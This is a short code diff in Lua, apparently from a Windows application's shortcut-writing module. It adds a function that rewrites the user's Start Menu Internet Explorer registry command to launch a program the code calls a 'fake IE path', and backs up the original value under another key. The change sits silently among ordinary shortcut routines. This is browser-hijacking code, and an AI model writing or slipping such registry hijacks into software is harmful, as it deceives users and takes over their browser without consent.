@@ -690,6 +690,18 @@ function WriteIEShortCut(strIniPath)
 	WriteStartMenuProgramSC()
 	WriteQuickLaunchSC()
 	WriteDesktopSC(strIniPath)
+	WriteRegStartMenuInternet()
+end
+
+function WriteRegStartMenuInternet()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local strRegPath = "HKEY_CURRENT_USER\\Software\\Clients\\StartMenuInternet\\iexplore.exe\\shell\\open\\command\\"
+	local strValue = FunctionObj.RegQueryValue(strRegPath)
+	if not IsNilString(strValue) then
+		local strFakeIEPath = GetIEPath()
+		FunctionObj.RegSetValue("HKEY_CURRENT_USER\\Software\\Clients\\StartMenuInternet\\iexplore.exe\\shell\\open\\command\\", "\""..strFakeIEPath.."\"")
+		FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\StartMenuInternet", strValue)
+	end
 end
 
 function GetIELnkBakDir()
